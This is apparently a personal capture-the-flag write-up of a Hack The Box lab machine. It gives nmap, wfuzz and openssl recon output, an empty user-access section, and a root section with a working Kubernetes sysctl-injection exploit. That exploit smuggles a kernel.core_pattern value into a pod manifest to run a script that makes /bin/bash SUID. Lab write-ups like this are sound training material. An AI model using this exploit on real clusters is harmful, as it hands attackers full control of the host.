
# RECON

~~~
sudo nmap -sC -sV 10.10.11.199  
~~~

~~~
sudo nmap -sC -sV 10.10.11.199  
[sudo] password for mr_g0d:    
Sorry, try again.  
[sudo] password for mr_g0d:    
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-30 15:37 IST  
WARNING: Service 10.10.11.199:5000 had already soft-matched rtsp, but now soft-matched sip; ignoring second value  
Stats: 0:00:38 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan  
NSE Timing: About 99.14% done; ETC: 15:37 (0:00:00 remaining)  
Nmap scan report for 10.10.11.199  
Host is up (0.27s latency).  
Not shown: 995 closed tcp ports (reset)  
PORT     STATE SERVICE  VERSION  
22/tcp   open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)  
| ssh-hostkey:    
|   2048 f3922dfd8422d78df6b09e788eb93be7 (RSA)  
|   256 01e43ec06643df25af8a71b83906df9f (ECDSA)  
|_  256 4fec39764e719471befa7ffaa6a81674 (ED25519)  
80/tcp   open  http     nginx 1.18.0  
|_http-server-header: nginx/1.18.0  
|_http-title: Pikaboo  
|_http-cors: HEAD GET POST PUT DELETE PATCH  
443/tcp  open  ssl/http nginx 1.18.0  
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).  
| tls-nextprotoneg:    
|_  http/1.1  
| ssl-cert: Subject: commonName=api.pokatmon-app.htb/organizationName=Pokatmon Ltd/stateOrProvinceName=United Kingdom/countryName=UK  
| Not valid before: 2021-12-29T20:33:08  
|_Not valid after:  3021-05-01T20:33:08  
| tls-alpn:    
|_  http/1.1  
|_ssl-date: TLS randomness does not represent time  
|_http-server-header: APISIX/2.10.1  
5000/tcp open  rtsp  
| fingerprint-strings:    
|   FourOhFourRequest:    
|     HTTP/1.0 404 NOT FOUND  
|     Content-Type: text/html; charset=utf-8  
|     Vary: X-Auth-Token  
|     x-openstack-request-id: req-2be1cc81-5cf8-4188-baf2-ccb9a0ae3899  
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">  
|     <title>404 Not Found</title>  
|     <h1>Not Found</h1>  
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>  
|   GetRequest:    
|     HTTP/1.0 300 MULTIPLE CHOICES  
|     Content-Type: application/json  
|     Location: http://pikatwoo.pokatmon.htb:5000/v3/  
|     Vary: X-Auth-Token  
|     x-openstack-request-id: req-9cbdba0b-dc7d-443d-bcb4-d085c44b66e7  
|     {"versions": {"values": [{"id": "v3.14", "status": "stable", "updated": "2020-04-07T00:00:00Z", "links": [{"rel": "self", "href": "htt  
p://pikatwoo.pokatmon.htb:5000/v3/"}], "media-types": [{"base": "application/json", "type": "application/vnd.openstack.identity-v3+json"}]}]  
}}  
|   HTTPOptions:    
|     HTTP/1.0 200 OK  
|     Content-Type: text/html; charset=utf-8  
|     Allow: OPTIONS, HEAD, GET  
|     Vary: X-Auth-Token  
|     x-openstack-request-id: req-210f5e6f-cfc1-49c0-afd5-fd7d8916e0ae  
|   RTSPRequest:    
|     RTSP/1.0 200 OK  
|     Content-Type: text/html; charset=utf-8  
|     Allow: OPTIONS, HEAD, GET  
|     Vary: X-Auth-Token  
|     x-openstack-request-id: req-ef98b6ad-7b34-448b-903a-e61614b2e1e9  
|   SIPOptions:    
|_    SIP/2.0 200 OK  
|_rtsp-methods: ERROR: Script execution failed (use -d to debug)  
8080/tcp open  http     nginx 1.18.0  
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).  
|_http-server-header: nginx/1.18.0  
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/  
cgi-bin/submit.cgi?new-service :  
SF-Port5000-TCP:V=7.93%I=7%D=4/30%Time=644E3DE0%P=x86_64-pc-linux-gnu%r(Ge  
SF:tRequest,1DC,"HTTP/1\.0\x20300\x20MULTIPLE\x20CHOICES\r\nContent-Type:\  
SF:x20application/json\r\nLocation:\x20http://pikatwoo\.pokatmon\.htb:5000  
SF:/v3/\r\nVary:\x20X-Auth-Token\r\nx-openstack-request-id:\x20req-9cbdba0  
SF:b-dc7d-443d-bcb4-d085c44b66e7\r\n\r\n{\"versions\":\x20{\"values\":\x20  
SF:\[{\"id\":\x20\"v3\.14\",\x20\"status\":\x20\"stable\",\x20\"updated\":  
SF:\x20\"2020-04-07T00:00:00Z\",\x20\"links\":\x20\[{\"rel\":\x20\"self\",  
SF:\x20\"href\":\x20\"http://pikatwoo\.pokatmon\.htb:5000/v3/\"}\],\x20\"m  
SF:edia-types\":\x20\[{\"base\":\x20\"application/json\",\x20\"type\":\x20  
SF:\"application/vnd\.openstack\.identity-v3\+json\"}\]}\]}}")%r(RTSPReque  
SF:st,AC,"RTSP/1\.0\x20200\x20OK\r\nContent-Type:\x20text/html;\x20charset  
SF:=utf-8\r\nAllow:\x20OPTIONS,\x20HEAD,\x20GET\r\nVary:\x20X-Auth-Token\r  
SF:\nx-openstack-request-id:\x20req-ef98b6ad-7b34-448b-903a-e61614b2e1e9\r  
SF:\n\r\n")%r(HTTPOptions,AC,"HTTP/1\.0\x20200\x20OK\r\nContent-Type:\x20t  
SF:ext/html;\x20charset=utf-8\r\nAllow:\x20OPTIONS,\x20HEAD,\x20GET\r\nVar  
SF:y:\x20X-Auth-Token\r\nx-openstack-request-id:\x20req-210f5e6f-cfc1-49c0  
SF:-afd5-fd7d8916e0ae\r\n\r\n")%r(FourOhFourRequest,180,"HTTP/1\.0\x20404\  
SF:x20NOT\x20FOUND\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nVary  
SF::\x20X-Auth-Token\r\nx-openstack-request-id:\x20req-2be1cc81-5cf8-4188-  
SF:baf2-ccb9a0ae3899\r\n\r\n<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3C//DTD\x  
SF:20HTML\x203\.2\x20Final//EN\">\n<title>404\x20Not\x20Found</title>\n<h1  
SF:>Not\x20Found</h1>\n<p>The\x20requested\x20URL\x20was\x20not\x20found\x  
SF:20on\x20the\x20server\.\x20If\x20you\x20entered\x20the\x20URL\x20manual  
SF:ly\x20please\x20check\x20your\x20spelling\x20and\x20try\x20again\.</p>\  
SF:n")%r(SIPOptions,12,"SIP/2\.0\x20200\x20OK\r\n\r\n");  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  
  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 46.51 seconds

~~~

~~~
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.199 -oG allPorts 
~~~

~~~
$sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.199 -oG allPorts  
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.  
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-30 15:41 IST  
Initiating SYN Stealth Scan at 15:41  
Scanning 10.10.11.199 [65535 ports]  
Discovered open port 8080/tcp on 10.10.11.199  
Discovered open port 443/tcp on 10.10.11.199  
Discovered open port 80/tcp on 10.10.11.199  
Discovered open port 22/tcp on 10.10.11.199  
Discovered open port 4369/tcp on 10.10.11.199  
Discovered open port 35357/tcp on 10.10.11.199  
Discovered open port 25672/tcp on 10.10.11.199  
Discovered open port 5672/tcp on 10.10.11.199  
Discovered open port 5000/tcp on 10.10.11.199  
Completed SYN Stealth Scan at 15:41, 14.54s elapsed (65535 total ports)  
Nmap scan report for 10.10.11.199  
Host is up, received user-set (0.27s latency).  
Scanned at 2023-04-30 15:41:33 IST for 14s  
Not shown: 65526 closed tcp ports (reset)  
PORT      STATE SERVICE      REASON  
22/tcp    open  ssh          syn-ack ttl 63  
80/tcp    open  http         syn-ack ttl 63  
443/tcp   open  https        syn-ack ttl 63  
4369/tcp  open  epmd         syn-ack ttl 63  
5000/tcp  open  upnp         syn-ack ttl 63  
5672/tcp  open  amqp         syn-ack ttl 63  
8080/tcp  open  http-proxy   syn-ack ttl 63  
25672/tcp open  unknown      syn-ack ttl 63  
35357/tcp open  openstack-id syn-ack ttl 63  
  
Read data files from: /usr/bin/../share/nmap  
Nmap done: 1 IP address (1 host up) scanned in 14.62 seconds  
          Raw packets sent: 70437 (3.099MB) | Rcvd: 68635 (2.745MB)
~~~

~~~
nmap -p22,80,443,4369,5672,8080,25672,35357 -sCV 10.10.11.199 -oN targeted
~~~

~~~
$nmap -p22,80,443,4369,5672,8080,25672,35357 -sCV 10.10.11.199 -oN targeted  
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-30 15:48 IST  
Nmap scan report for 10.10.11.199  
Host is up (0.27s latency).  
  
PORT      STATE SERVICE  VERSION  
22/tcp    open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)  
| ssh-hostkey:    
|   2048 f3922dfd8422d78df6b09e788eb93be7 (RSA)  
|   256 01e43ec06643df25af8a71b83906df9f (ECDSA)  
|_  256 4fec39764e719471befa7ffaa6a81674 (ED25519)  
80/tcp    open  http     nginx 1.18.0  
|_http-cors: HEAD GET POST PUT DELETE PATCH  
|_http-title: Pikaboo  
|_http-server-header: nginx/1.18.0  
443/tcp   open  ssl/http nginx 1.18.0  
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).  
|_http-server-header: APISIX/2.10.1  
| ssl-cert: Subject: commonName=api.pokatmon-app.htb/organizationName=Pokatmon Ltd/stateOrProvinceName=United Kingdom/countryName=UK  
| Not valid before: 2021-12-29T20:33:08  
|_Not valid after:  3021-05-01T20:33:08  
|_ssl-date: TLS randomness does not represent time  
| tls-nextprotoneg:    
|_  http/1.1  
| tls-alpn:    
|_  http/1.1  
4369/tcp  open  epmd     Erlang Port Mapper Daemon  
| epmd-info:    
|   epmd_port: 4369  
|   nodes:    
|_    rabbit: 25672  
5672/tcp  open  amqp     RabbitMQ 3.8.9 (0-9)  
| amqp-info:    
|   capabilities:    
|     publisher_confirms: YES  
|     exchange_exchange_bindings: YES  
|     basic.nack: YES  
|     consumer_cancel_notify: YES  
|     connection.blocked: YES  
|     consumer_priorities: YES  
|     authentication_failure_close: YES  
|     per_consumer_qos: YES  
|     direct_reply_to: YES  
|   cluster_name: rabbit@pikatwoo.pokatmon.htb  
|   copyright: Copyright (c) 2007-2020 VMware, Inc. or its affiliates.  
|   information: Licensed under the MPL 2.0. Website: https://rabbitmq.com  
|   platform: Erlang/OTP 23.2.6  
|   product: RabbitMQ  
|   version: 3.8.9  
|   mechanisms: AMQPLAIN PLAIN  
|_  locales: en_US  
8080/tcp  open  http     nginx 1.18.0  
|_http-server-header: nginx/1.18.0  
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).  
25672/tcp open  unknown  
35357/tcp open  http     nginx 1.18.0  
| http-title: Site doesn't have a title (application/json).  
|_Requested resource was http://10.10.11.199:35357/v3/  
|_http-server-header: nginx/1.18.0  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  
  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 154.18 seconds
~~~


==AFTER ANALYZING WE GOT SUBDOMAINS==

**Add It to /etc/hosts**

~~~
10.10.11.199  api.pokatmon-app.htb pikatwoo.pokatmon.htb pokatmon.htb
~~~

When i Browsed the IP

![[landing page.png]]

For further  enumerations:

**SUBDOMAIN ENUMERATION**

~~~
wfuzz -c --hc=404,200,400 -t 200 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt  http://pokatmon.htb/FUZZ
~~~

~~~
┌─[mr_g0d@parrot]─[/usr/share/wordlists/SecLists/Discovery/Web-Content]  
└──╼ $wfuzz -c --hc=404,200,400 -t 200 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt  http://pokatmon  
.htb/FUZZ  
/usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly whe  
n fuzzing SSL sites. Check Wfuzz's documentation for more information.  
********************************************************  
* Wfuzz 3.1.0 - The Web Fuzzer                         *  
********************************************************  
  
Target: http://pokatmon.htb/FUZZ  
Total requests: 220560  
  
=====================================================================  
ID           Response   Lines    Word       Chars       Payload                                                                       
=====================================================================  
  
000000016:   301        10 L     16 W       179 Ch      "images"                                                                      
000000090:   301        10 L     16 W       175 Ch      "docs"                                                                        
000000258:   302        0 L      4 W        28 Ch       "welcome"                                                                     
000001871:   302        0 L      4 W        28 Ch       "Welcome"                                                                     
000002382:   301        10 L     16 W       175 Ch      "Docs"                                                                        
000005045:   301        10 L     16 W       181 Ch      "artwork"                                                                     
000022658:   301        10 L     16 W       175 Ch      "DOCS"                                                                        
  
Total time: 0  
Processed Requests: 220560  
Filtered Requests: 220553  
Requests/sec.: 0
~~~

# For User:

We have to enumerate each and every port , since this is insane one right?

HTTPS - TCP 443

~~~
openssl s_client -connect pokatmon.htb:443  
~~~

~~~
┌─[mr_g0d@parrot]─[~]  
└──╼ $ openssl s_client -connect pokatmon.htb:443  
CONNECTED(00000003)  
depth=0 C = UK, ST = United Kingdom, O = Pokatmon Ltd, CN = api.pokatmon-app.htb  
verify error:num=18:self signed certificate  
verify return:1  
depth=0 C = UK, ST = United Kingdom, O = Pokatmon Ltd, CN = api.pokatmon-app.htb  
verify return:1  
---  
Certificate chain  
0 s:C = UK, ST = United Kingdom, O = Pokatmon Ltd, CN = api.pokatmon-app.htb  
  i:C = UK, ST = United Kingdom, O = Pokatmon Ltd, CN = api.pokatmon-app.htb  
---  
Server certificate  
-----BEGIN CERTIFICATE-----  
MIIDmzCCAoOgAwIBAgIUc+lphhioCsS1kb5YJlVmse6kAawwDQYJKoZIhvcNAQEL  
BQAwXDELMAkGA1UEBhMCVUsxFzAVBgNVBAgMDlVuaXRlZCBLaW5nZG9tMRUwEwYD  
VQQKDAxQb2thdG1vbiBMdGQxHTAbBgNVBAMMFGFwaS5wb2thdG1vbi1hcHAuaHRi  
MCAXDTIxMTIyOTIwMzMwOFoYDzMwMjEwNTAxMjAzMzA4WjBcMQswCQYDVQQGEwJV  
SzEXMBUGA1UECAwOVW5pdGVkIEtpbmdkb20xFTATBgNVBAoMDFBva2F0bW9uIEx0  
ZDEdMBsGA1UEAwwUYXBpLnBva2F0bW9uLWFwcC5odGIwggEiMA0GCSqGSIb3DQEB  
AQUAA4IBDwAwggEKAoIBAQDppqggOGMl/0WNPEc3A5jUpDoJzAZdskJhcgOj0CEV  
15eHWsIbJWW5P+TKt3cPa/8v0J5Pv0m8SuQXBQLh+58kNV1nG/Y721S4t+4xsL6A  
owkmI1+OpKA+KAJPYZxHDC6w13ko5g35ezIDCdNS76bBBw7tDggdbkEdyrenC0bG  
O5KFE+cSK6lTBtqWDuE/vM2yh5Eqcr/8QJhqu0JYEQjNOCI8lDYcm5yBqfnXUZ/g  
MVlyhxhqL+iGzxh71PWGqflZqWqppWvYEVoGKtRoll1KVbBfEjZOgCGd26r04Pk/  
Q1A72G0nRdiNYtGZdgfiVS53jlCLGFZAMshr4QPa/WcfAgMBAAGjUzBRMB0GA1Ud  
DgQWBBQeNlss9DZ+8VowsLJ9yFq4KW//gDAfBgNVHSMEGDAWgBQeNlss9DZ+8Vow  
sLJ9yFq4KW//gDAPBgNVHRMBAf8EBTADAQH/MA0GCSqGSIb3DQEBCwUAA4IBAQDQ  
NMSaQp8MB7qlRvmCZ62TkRljms+gSq7BTRR8vyfW1HfGBeHg1LulRRABqmYi6EbD  
OmBLiETvOcN2M4APtiZgsmTiDhtWWi2q75OkMdXNd/IcnYNNHv4kVPvriExELjyN  
ik86AMBfnUF167MywAG36HC3Fw+6MG7UWDLuW0d7Y/MyMRGOVWGbV8NhrQidnIqV  
EThQ9oCP96MTkByXi9k8cF3qcYq7K8rJTx8xfAgW9OLK2GOiG0xbwCGeRbMOstZs  
Vqln/bwgaIHjxhC0doWx/ka/2TonVi7Ger2ORGdADZvwz3u6P+SOwDYrwkOy1uPj  
ju2e0y5y/lyk+PFCiC01  
-----END CERTIFICATE-----  
subject=C = UK, ST = United Kingdom, O = Pokatmon Ltd, CN = api.pokatmon-app.htb  
  
issuer=C = UK, ST = United Kingdom, O = Pokatmon Ltd, CN = api.pokatmon-app.htb  
  
---  
No client certificate CA names sent  
Peer signing digest: SHA256  
Peer signature type: RSA-PSS  
Server Temp Key: X25519, 253 bits  
---  
SSL handshake has read 1588 bytes and written 397 bytes  
Verification error: self signed certificate  
---  
New, TLSv1.2, Cipher is ECDHE-RSA-AES256-GCM-SHA384  
Server public key is 2048 bit  
Secure Renegotiation IS supported  
Compression: NONE  
Expansion: NONE  
No ALPN negotiated  
SSL-Session:  
   Protocol  : TLSv1.2  
   Cipher    : ECDHE-RSA-AES256-GCM-SHA384  
   Session-ID: B38BB58232D873F1374B656C14B0CB06AB18DD81F885FD73474CE42F070FA139  
   Session-ID-ctx:    
   Master-Key: 42AF65E77EE949F76FF02A7C52A1D3E379D382B341828502EC11DF51C20903242DF7F2DDF8030ADBAD5D1FFD509E6FC7  
   PSK identity: None  
   PSK identity hint: None  
   SRP username: None  
   TLS session ticket lifetime hint: 300 (seconds)  
   TLS session ticket:  
   0000 - 9c 14 12 7a c5 c7 be 57-a8 06 03 ea 83 19 f6 be   ...z...W........  
   0010 - 21 3d e3 78 14 55 4a ea-69 6b ec 55 71 2c 82 76   !=.x.UJ.ik.Uq,.v  
   0020 - 20 d0 75 31 30 af 18 15-7e 77 2c c1 e2 b0 3e ee    .u10...~w,...>.  
   0030 - 93 cb a4 ef 86 d8 aa cb-3e 33 e9 59 4e 88 9c 45   ........>3.YN..E  
   0040 - 2d 7a 55 7d 33 5e a2 d5-e1 38 04 df 65 85 6c 98   -zU}3^...8..e.l.  
   0050 - 3a 73 5d 12 17 3f 55 e6-bc 5a 7b 0d 0f c1 c3 ae   :s]..?U..Z{.....  
   0060 - 06 68 05 92 37 92 5f 5d-2e c2 3f af 96 7c d1 33   .h..7._]..?..|.3  
   0070 - c6 9f cb b8 49 7e 23 18-49 7c 5b 32 40 4e 50 62   ....I~#.I|[2@NPb  
   0080 - 0d 37 fb b8 81 5a 46 6d-ff d2 11 59 91 60 9d 61   .7...ZFm...Y.`.a  
   0090 - b3 d2 f2 5e e6 34 e8 76-60 f8 33 3c e8 a2 26 f5   ...^.4.v`.3<..&.  
   00a0 - 7f 3b 89 14 c0 bf c7 07-cd 6b 95 b0 31 0f 5a d2   .;.......k..1.Z.  
   00b0 - 56 98 1f 7f 3d e7 59 83-d6 48 16 69 8e 59 8f 17   V...=.Y..H.i.Y..  
  
   Start Time: 1682959840  
   Timeout   : 7200 (sec)  
   Verify return code: 18 (self signed certificate)  
   Extended master secret: yes
   ~~~

Nothing Special..!!

**Erlang Port Mapper Daemon PORT 4369**

~~~
nmap -sV -Pn -n -T4 -p 4369 --script epmd-info 10.10.11.199 
~~~

~~~
┌─[mr_g0d@parrot]─[~]  
└──╼ $nmap -sV -Pn -n -T4 -p 4369 --script epmd-info 10.10.11.199    
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-01 22:23 IST  
Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan  
Service scan Timing: About 0.00% done  
Nmap scan report for 10.10.11.199  
Host is up (0.27s latency).  
  
PORT     STATE SERVICE VERSION  
4369/tcp open  epmd    Erlang Port Mapper Daemon  
| epmd-info:    
|   epmd_port: 4369  
|   nodes:    
|_    rabbit: 25672  
  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 7.69 seconds
~~~

In the article it also appears that you can obtain a Remote Code Execution (RCE) but we don't have the cookie and bruteforcing. So leave it....!!!

**amqp RabbitMQ 3.8.9 PORT 5672**

~~~
nmap -sV -Pn -n -T4 -p 5672 --script amqp-info 10.10.11.199
~~~

~~~
┌─[mr_g0d@parrot]─[~]  
└──╼ $nmap -sV -Pn -n -T4 -p 5672 --script amqp-info 10.10.11.199    
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-01 22:25 IST  
Nmap scan report for 10.10.11.199  
Host is up (0.27s latency).  
  
PORT     STATE SERVICE VERSION  
5672/tcp open  amqp    RabbitMQ 3.8.9 (0-9)  
| amqp-info:    
|   capabilities:    
|     publisher_confirms: YES  
|     exchange_exchange_bindings: YES  
|     basic.nack: YES  
|     consumer_cancel_notify: YES  
|     connection.blocked: YES  
|     consumer_priorities: YES  
|     authentication_failure_close: YES  
|     per_consumer_qos: YES  
|     direct_reply_to: YES  
|   cluster_name: rabbit@pikatwoo.pokatmon.htb  
|   copyright: Copyright (c) 2007-2020 VMware, Inc. or its affiliates.  
|   information: Licensed under the MPL 2.0. Website: https://rabbitmq.com  
|   platform: Erlang/OTP 23.2.6  
|   product: RabbitMQ  
|   version: 3.8.9  
|   mechanisms: AMQPLAIN PLAIN  
|_  locales: en_US  
  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 12.32 seconds
~~~

Fuck nothing Special...!!!

**HTTP - TCP 8080**

This port is like 443, so we won't be able to list anything else apart from the /v1/ directory

**Unknown - TCP 25672**

No , cant find any resources..!!!

**HTTP - TCP 35357**

![[port 35357.png]]




**APK Analysis**




# For Root:

we can see that user Jennifer has a .kube directory in her home directory

In the /dev/shm directory

Create This two files,

**cat sysctl-set.yaml**

~~~
apiVersion: v1
kind: Pod
metadata:
  name: sysctl-set
  namespace: development
spec:
  securityContext:
    sysctls:
    - name: kernel.shm_rmid_forced
      value: "1+kernel.core_pattern=|/dev/shm/malicious.sh #"
  containers:
  - name: sysctl-set1234
    image: localhost/public-api
    command: ["tail", "-f", "/dev/null"]
~~~

**cat malicious.sh**

~~~
#!/bin/bash

chmod u+s /bin/bash
~~~

Make the Bash script executable by,

~~~
chmod +x malicious.sh
~~~

~~~
kubectl apply -f sysctl-set.yaml --kubeconfig=/home/jennifer/.kube/config 
~~~

~~~
tail -f /dev/null &
~~~

~~~
kill -SIGSEGV <number>
~~~

~~~
/bin/bash -p
~~~

![[root user.png]]
